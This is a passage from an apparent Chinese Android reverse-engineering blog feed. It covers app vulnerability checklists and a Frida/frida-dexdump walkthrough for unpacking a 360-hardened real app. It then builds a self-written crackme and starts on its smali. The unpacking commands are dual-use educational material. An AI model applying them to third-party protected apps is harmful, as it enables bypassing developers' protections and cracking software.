id="1-3-2-数据封包弱加密"><a href="#1-3-2-数据封包弱加密" class="headerlink" title="1.3.2 数据封包弱加密"></a>1.3.2 数据封包弱加密</h3><p>App网络协议封包普遍存在弱加密易解密的主要原因是：Key/IV/CER等密钥的硬编码。</p><h3 id="1-3-3-手机验证码机制安全"><a href="#1-3-3-手机验证码机制安全" class="headerlink" title="1.3.3 手机验证码机制安全"></a>1.3.3 手机验证码机制安全</h3><ul><li>验证码是否可无限请求：短信轰炸接口，浪费资源</li><li>是否可重复使用：有效次数只有一次，且新验证码要覆盖旧验证码</li><li>是否是真正随机：实时使用实时随机</li><li>是否返回到本地：所有具有验证码凭证性质的数据都不能返回到本地</li><li>验证码的错误次数是否限定：防止位数较短的验证码被恶意爆破</li><li>是否可被绕过：在注册、找回密码的最终请求中抛弃了验证码，可能存在绕过</li></ul><img src="/posts/c971a26a/1.2.3.png" class="" title="壳">]]></content>
    
    
    <summary type="html">&lt;p&gt;Android系统中常见的漏洞类型。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>利用Frida脱App壳</title>
    <link href="http://example.com/posts/80f0c627.html"/>
    <id>http://example.com/posts/80f0c627.html</id>
    <published>2022-08-07T14:37:14.702Z</published>
    <updated>2022-08-13T07:05:42.088Z</updated>
    
    <content type="html"><![CDATA[<p>从前面的笔记我们已经知道Frida如何安装并可以用来进行Native层注入，Frida其实还有一个很强大的功能，就是脱壳。这篇文章就来认识一下Android的壳与记录一下Frida脱壳的基本步骤。</p><span id="more"></span><h1 id="1-Android壳的类型"><a href="#1-Android壳的类型" class="headerlink" title="1. Android壳的类型"></a>1. Android壳的类型</h1><p>壳的种类非常多，根据其种类不同，使用的技术也不同，这里稍微简单分个类：</p><ul><li>一代整体型壳：采用Dex整体加密，动态加载运行的机制；</li><li>二代函数抽取型壳：粒度更细，将方法单独抽取出来，加密保存，解密执行；</li><li>三代VMP、Dex2C壳：独立虚拟机解释执行、语义等价语法迁移，强度最高。</li></ul><p>先说最难的<code>Dex2C</code>目前是没有办法还原的，只能跟踪进行分析；<code>VMP</code>虚拟机解释执行保护的是映射表，只要心思细、功夫深，是可以将映射表还原的；二代壳函数抽取目前是可以从根本上进行还原的，<code>dump</code>出所有的运行时的方法体，填充到<code>dump</code>下来的<code>dex</code>中去的，这也是<a href="https://bbs.pediy.com/user-632473.htm"><code>fart</code></a>的核心原理；最后也就是目前我们推荐的几个内存中搜索和<code>dump</code>出<code>dex</code>的<code>Frida</code>工具，在一些场景中可以满足大家的需求。</p><h1 id="2-一代壳加固原理"><a href="#2-一代壳加固原理" class="headerlink" title="2. 一代壳加固原理"></a>2. 一代壳加固原理</h1><p>一代壳也称落地加载，就是对源APK进行加密，再套上一层壳，在运行时对源AOK进行解密并动态加载。</p><p>加固过程需要三个对象：</p><ul><li>待加固APK，也就是源APK</li><li>壳程序APK，负责对源APK进行解密</li><li>加密工具，负责加密源APK并与壳DEX合并成新的DEX</li></ul><h2 id="2-1-加固的主要步骤"><a href="#2-1-加固的主要步骤" class="headerlink" title="2.1 加固的主要步骤"></a>2.1 加固的主要步骤</h2><p>拿到源APK和壳程序APK，用加密算法对源APK进行加密，再将加密后的APK文件与壳APK中的DEX文件进行合并得到一个新的DEX文件，最后替换壳程序APK中的DEX文件即可。此时得到一个新的APK文件，那么该APK就是加固后的APK，它的主要工作是在运行时解密源APK，然后动态加载，让其正常运行起来。</p><p>合并时主要关注DEX文件的dex header中的checksum、signature、file_size字段。因为我们需要将一个文件写入到DEX中，那么我们肯定需要修改文件校验码(checksum)，因为它用于检查文件是否有错误。同样需要修改signature，它唯一识别DEX文件。还有就是需要修改DEX文件的大小(file_size)。</p><ul><li>checksum：文件校验码。使用alder32算法校验文件中除maigc和checksum外剩下的所有文件区域，用于检查文件错误。</li><li>signature：使用SHA-1算法对除magic 、checksum和signature外剩下的的所有文件区域做HASH运算，用于唯一识别DEX文件。</li><li>file_size：DEX文件大小。</li></ul><p>不过将源APK写入到DEX文件以后还需要将加密后APK的大小添加在文件末尾，目的就是在脱壳时根据文件大小得到正确的源APK。所以合并以后得到的新DEX文件结构如下图所示：</p><img src="/posts/80f0c627/1.1.1.jpg" class="" title="加固后的DEX文件"><h1 id="3-一代壳脱壳工具dexdump"><a href="#3-一代壳脱壳工具dexdump" class="headerlink" title="3. 一代壳脱壳工具dexdump"></a>3. 一代壳脱壳工具dexdump</h1><p>脱壳方法：一种是从内存中找到DEX；另一种是基于Hook然后判断是否是DEX，dump_dex &amp;&amp; Frida_fart。</p><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install objection</span><br><span class="line">pip3 install frida-dexdump</span><br></pre></td></tr></table></figure><h2 id="3-2-脱壳步骤"><a href="#3-2-脱壳步骤" class="headerlink" title="3.2 脱壳步骤"></a>3.2 脱壳步骤</h2><p>如果在Android设备上下载的APK，先将APK使用<code>adb pull</code>命令将它从Android设备拉出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull xxxx.apk</span><br></pre></td></tr></table></figure><p>如果需要安装至Android设备则使用<code>adb install</code>命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install xxxx.apk</span><br></pre></td></tr></table></figure><p>用Android查壳工具查看APK程序是否加壳，APK使用了360加固。</p><img src="/posts/80f0c627/1.1.2.png" class="" title="APP查壳"><p>载入jadx，代码做了混淆，看不出什么名堂来。</p><img src="/posts/80f0c627/1.1.3.png" class="" title="jadx查看"><p>那我们可以先来脱壳。运行frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vbox86p:/data/local/tmp # ./frida-server-15.2.2-android-x86</span><br></pre></td></tr></table></figure><p>在jadx中查看它的包名为com.coolapk.market，使用objection工具连接Android设备中的App。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9&gt;objection -g com.coolapk.market explore</span><br></pre></td></tr></table></figure><p>列出该APK文件的所有Activity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.coolapk.market on (Android: 9) [usb] # android hooking list activities</span><br></pre></td></tr></table></figure><p>进入某个Activity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.coolapk.market on (Android: 9) [usb] # android intent launch_activity xxx.xxx.xxx.xxxActivity</span><br></pre></td></tr></table></figure><p>动态加载dexdump工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.coolapk.market on (Android: 9) [usb] # plugin load root/.obejection/plugins/dexdump/frida_dexdump</span><br></pre></td></tr></table></figure><p>利用dexdump进行简单脱壳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.coolapk.market on (Android: 9) [usb] # plugin dexdump dump</span><br></pre></td></tr></table></figure><p>或利用frida-dexdump进行脱壳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9&gt;frida-dexdump -U -f com.coolapk.market</span><br></pre></td></tr></table></figure><p>脱壳成功后会在当前目录生成一堆DEX文件。一般都是找其中DEX文件最大的那个，并且有MainActivity类的DEX文件来分析。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;从前面的笔记我们已经知道Frida如何安装并可以用来进行Native层注入，Frida其实还有一个很强大的功能，就是脱壳。这篇文章就来认识一下Android的壳与记录一下Frida脱壳的基本步骤。&lt;/p&gt;</summary>
    
    
    
    <category term="Android逆向" scheme="http://example.com/categories/Android%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Android软件安全与逆向分析</title>
    <link href="http://example.com/posts/d368aa06.html"/>
    <id>http://example.com/posts/d368aa06.html</id>
    <published>2022-07-31T08:30:47.469Z</published>
    <updated>2022-08-11T14:47:02.980Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记是学习看雪“非虫”的《Android软件安全与逆向分析》一书中的内容所写。</p><span id="more"></span><h1 id="1-Windows下环境搭建"><a href="#1-Windows下环境搭建" class="headerlink" title="1. Windows下环境搭建"></a>1. Windows下环境搭建</h1><h2 id="1-1-安装JDK"><a href="#1-1-安装JDK" class="headerlink" title="1.1 安装JDK"></a>1.1 安装JDK</h2><p><a href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a></p><p>一定一定要安装Java8，我被其他版本搞死了。安装完成后，在CMD窗口输入以下三条命令，都有信息出来则表明安装成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java</span><br><span class="line">javac</span><br><span class="line">javap</span><br></pre></td></tr></table></figure><h2 id="1-2-安装Android-SDK"><a href="#1-2-安装Android-SDK" class="headerlink" title="1.2 安装Android SDK"></a>1.2 安装Android SDK</h2><p><a href="https://dl.google.com/android/installer_r24.4.1-windows.exe">https://dl.google.com/android/installer_r24.4.1-windows.exe</a></p><p>SDK要放在没有空格的路径中，否则在配置Android Studio时会报错。安装完成后，“以管理员身份运行”android-sdk目录下的<code>SDK Manager.exe</code>，为了方便后续操作，安卓系统选择Android 9(API 28)，其余默认安装就好。安装完成后该目录下会多出来很多文件夹，将tools文件夹和platform-tools文件夹添加到系统的PATH环境变量中。</p><p>在CMD窗口输入以下两条命令，都有信息出来则表明安装成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">emulator -version</span><br><span class="line">adb version</span><br></pre></td></tr></table></figure><p>如果输入第一条命令后显示如下错误，说明已经安装，提示是说命令格式不对。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9&gt;emulator -version</span><br><span class="line">emulator: ERROR: No AVD specified. Use &#x27;@foo&#x27; or &#x27;-avd foo&#x27; to launch a virtual device named &#x27;foo&#x27;</span><br></pre></td></tr></table></figure><h2 id="1-3-安装Android-NDK"><a href="#1-3-安装Android-NDK" class="headerlink" title="1.3 安装Android NDK"></a>1.3 安装Android NDK</h2><p><a href="https://dl.google.com/android/repository/android-ndk-r25-windows.zip">https://dl.google.com/android/repository/android-ndk-r25-windows.zip</a></p><p>傻瓜式操作，最好也不要放在有空格的路径中。</p><h2 id="1-4-安装Android-Studio"><a href="#1-4-安装Android-Studio" class="headerlink" title="1.4 安装Android Studio"></a>1.4 安装Android Studio</h2><p><a href="http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe">http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe</a></p><p>在官网下载将https修改为http即可下载，否则会一直打不开页面。</p><h1 id="2-分析Android程序"><a href="#2-分析Android程序" class="headerlink" title="2. 分析Android程序"></a>2. 分析Android程序</h1><h2 id="2-1-编写Android程序"><a href="#2-1-编写Android程序" class="headerlink" title="2.1 编写Android程序"></a>2.1 编写Android程序</h2><p>使用Android Studio创建一个Empty Activity，命名为crackme。</p><p>首先设计显示界面。打开工程的<code>activity_main.xml</code>布局文件，添加用户名与注册码编辑框。</p><img src="/posts/d368aa06/2.1.1.png" class="" title="设计界面"><p>接着编写<code>MainActivity.java</code>，将注册的核心算法设计好。的输入框与用户输入连接起来。在<code>MainActivity</code>类中添加一个<code>checkSN()</code>方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkSN</span><span class="params">(String username, String sn)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((username == <span class="literal">null</span>) || (username.length() == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>((sn == <span class="literal">null</span>) || (sn.length() != <span class="number">16</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">digest</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);<span class="comment">//返回实现MD5摘要算法的 MessageDigest 对象</span></span><br><span class="line">        digest.reset();<span class="comment">//将待摘要数据重置，即初始化</span></span><br><span class="line">        digest.update(username.getBytes());<span class="comment">//将username转化为字节数组，作为待摘要数据</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = digest.digest();<span class="comment">//执行摘要算法，结果存入字节数组</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes)</span><br><span class="line">        &#123;<span class="comment">//从字节数组中依次取出1个字节</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">hexstr</span> <span class="operator">=</span> Integer.toHexString(b &amp; <span class="number">0xff</span>);<span class="comment">//将每个字节转化为十六进制字符串</span></span><br><span class="line">            <span class="keyword">if</span> (hexstr.length() == <span class="number">1</span>)</span><br><span class="line">            &#123;<span class="comment">//如果得出的结果长度为1，则在前面加0，保证每个字节转字符串后加入序列时是两个字符</span></span><br><span class="line">                hexstr = <span class="string">&quot;0&quot;</span> + hexstr;</span><br><span class="line">            &#125;</span><br><span class="line">            sb1.append(hexstr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;sb1.length(); i+=<span class="number">2</span>)</span><br><span class="line">            sb2.append(sb1.charAt(i));<span class="comment">//将摘要的奇位数作为sn</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">userSN</span> <span class="operator">=</span> sb2.toString();</span><br><span class="line">        <span class="keyword">if</span>(!userSN.equalsIgnoreCase(sn))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(NoSuchAlgorithmException e)</span><br><span class="line">    &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>MessageDigest 类为应用程序提供信息摘要算法的功能，如 MD5 或 SHA 算法。信息摘要是安全的单向哈希函数，它接收任意大小的数据，并输出固定长度的哈希值。MessageDigest 对象开始被初始化，该对象通过使用 update() 方法处理数据。任何时候都可以调用 reset() 方法重置摘要。一旦所有需要更新的数据都已经被更新了，应该调用 digest() 方法之一完成哈希计算。对于给定数量的更新数据，digest() 方法只能被调用一次。在调用 digest() 之后，MessageDigest 对象被重新设置成其初始状态。</p><p>在 StringBuilder 上的主要操作是 append() 和 insert() 方法。每个方法都能有效地将给定的数据转换成字符串，然后将该字符串的字符添加或插入到字符串生成器中。由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。它们原理一样。</p><p>charAt(int index)方法是一个能够用来检索特定索引下的字符的String实例的方法。</p></blockquote><p>在<code>OnCreate()</code>方法中加入注册按钮点击事件的监听器，如果用户名与注册码匹配就弹出注册成功的提示，不匹配则提示无效的用户名或注册码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    setTitle(R.string.unregister);</span><br><span class="line">    <span class="type">EditText</span> <span class="variable">edit_username</span> <span class="operator">=</span> (EditText) findViewById(R.id.editTextTextPersonName);</span><br><span class="line">    <span class="type">EditText</span> <span class="variable">edit_sn</span> <span class="operator">=</span> (EditText) findViewById(R.id.editTextTextPersonName2);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">btn_register</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">    btn_register.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!checkSN(edit_username.getText().toString().trim(), edit_sn.getText().toString().trim()))</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, R.string.unsuccessed, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, R.string.successed, Toast.LENGTH_SHORT).show();</span><br><span class="line">                btn_register.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                setTitle(R.string.registered);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>R.string.xxxx</code>出错，这是因为我们还没在<code>strings.xml</code>中定义这些字符串。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;unregister&quot;</span>&gt;</span>程序未注册<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;registered&quot;</span>&gt;</span>程序已注册<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;successed&quot;</span>&gt;</span>注册成功！<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;unsuccessed&quot;</span>&gt;</span>注册失败！<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/posts/d368aa06/2.1.2.png" class="" title="定义字符串"><p>设置好后，代码就不报错了。使用Genymotion插件启动虚拟设备，点击绿色三角符号将项目打包成APK发送至虚拟设备并在虚拟设备上运行。</p><p>别忘了弄布局，否则下图就是反面教材。</p><img src="/posts/d368aa06/2.1.3.png" class="" title="设计界面"><p>我们刚才在<code>strings.xml</code>中定义的字符串可以在设计界面时就设置好。</p><img src="/posts/d368aa06/2.1.4.png" class="" title="设计界面"><p>可以用hint属性(灰色)来提示用户输入，如果用text属性(黑色)会直接在框中输入，用户如果需要输入则要删掉框中文本再输入，text属性如果使用一般是默认值。</p><img src="/posts/d368aa06/2.1.5.png" class="" title="设计界面"><p>效果如下图，有内味了。</p><img src="/posts/d368aa06/2.1.6.png" class="" title="效果图"><h2 id="2-2-破解Android程序"><a href="#2-2-破解Android程序" class="headerlink" title="2.2 破解Android程序"></a>2.2 破解Android程序</h2><p>破解Android程序的第一步就是要将APK文件反编译，生成Smali格式的反汇编代码，阅读Smali文件的代码来理解程序的运行机制，或更进一步反编译成Java源码，更好理解程序流程。</p><p>将APK文件反汇编成Smali格式需要用到<a href="https://ibotpeaches.github.io/Apktool/">Apktool</a>工具，官网也很明确地给出了用法，两个命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反汇编APK文件：apktool d[ecode] [OPTS] &lt;file.apk&gt; [&lt;dir&gt;]</span><br><span class="line">编译APK文件：apktool b[uild] [OPTS] [&lt;app_path&gt;] [&lt;out_file&gt;]</span><br></pre></td></tr></table></figure><p>也可以用<a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip">Android Killer</a>图形化工具(下称AK)，它集成了apktool工具和APK签名工具，可以查看和修改Smali代码，将APK文件安装到虚拟设备等，所以还挺方便的。</p><p>点击Android Studio(下称AS)中的小锤子图标(Make Project)将上面代码打包成APK文件放到本地，路径为<code>D:\Java\Android\crackme\app\build\intermediates\apk\debug\app-debug.apk</code>，也可能在<code>D:\Java\Android\crackme\app\build\outputs\apk\debug\app-debug.apk</code>，多找找。将该APK文件反汇编成Smali代码到当前目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Java\Android\crackme\app\build\intermediates\apk\debug&gt; apktool d app-debug.apk</span><br><span class="line">I: Using Apktool 2.6.1 on app-debug.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: C:\Users\dell\AppData\Local\apktool\framework\1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Baksmaling classes3.dex...</span><br><span class="line">I: Baksmaling classes2.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br><span class="line">PS D:\Java\Android\crackme\app\build\intermediates\apk\debug&gt;</span><br></pre></td></tr></table></figure><p>如何寻找突破口是分析一个程序的关键。对于一般的Android来说，错误提示信息通常是指引关键代码的风向标。在错误提示附近一般是程序的核心验证代码。错误提示是Android程序中的字符串资源，开发Android程序时，这些字符串可能硬编码到源码中，也可能引用自<code>res\values\strings.xml</code>。APK在打包时，<code>strings.xml</code>中的字符串被加密存储为<code>resources.arsc</code>文件保存到APK程序包中，APK被成功反编译后这个文件也被解密出来了。</p><p>如果是硬编码，字符串以Unicode编码的方式写在了Smali代码中；如果是<code>strings.xml</code>中，字符串就是我们看到的文本模样。</p><img src="/posts/d368aa06/2.1.7.png" class="" title="strings.xml"><p>开发Android程序时，<code>strings.xml</code>文件中的所有字符串资源都在<code>R.java</code>文件的String类被标识，每个字符串都有唯一的int类型索引值，使用Apktool反编译APK文件后，所有的索引值保存在<code>strings.xml</code>文件同目录下的<code>public.xml</code>文件中。</p><img src="/posts/d368aa06/2.2.1.png" class="" title="public.xml"><p>unsuccessed的id值为0x7f0e006d，在smali目录中搜索含有内容为0x7f0e006d的文件，最后发现只有<code>MainActivity$1.smali</code>文件一处调用，代码如下：</p><img src="/posts/d368aa06/2.2.2.png" class="" title="查找0x7f0e006d"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods</span><br><span class="line">.method public onClick(Landroid/view/View;)V</span><br><span class="line">    .locals 3</span><br><span class="line">    .param p1, &quot;v&quot;    # Landroid/view/View;</span><br><span class="line"></span><br><span class="line">    .line 29</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    iget-object v1, p0, Lcom/example/crackme/MainActivity$1;-&gt;val$edit_username:Landroid/widget/EditText;</span><br><span class="line"># 取用户名存到v1</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/lang/String;-&gt;trim()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    iget-object v2, p0, Lcom/example/crackme/MainActivity$1;-&gt;val$edit_sn:Landroid/widget/EditText;</span><br><span class="line"># 取注册码存到v2</span><br><span class="line">    invoke-virtual &#123;v2&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2&#125;, Ljava/lang/String;-&gt;trim()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v0, v1, v2&#125;, Lcom/example/crackme/MainActivity;-&gt;access$000(Lcom/example/crackme/MainActivity;Ljava/lang/String;Ljava/lang/String;)Z</span><br><span class="line"># 将v0、v1、v2放进MainActivity中的access$000中进行运算，返回值为Boolean类型</span><br><span class="line">    move-result v0</span><br><span class="line"># 将结果放到v0</span><br><span class="line">    const/4 v1, 0x0</span><br><span class="line"></span><br><span class="line">    if-nez v0, :cond_0</span><br><span class="line"># 如果v0不等于0，则跳到:cond_0。否则继续往下执行。</span><br><span class="line"># 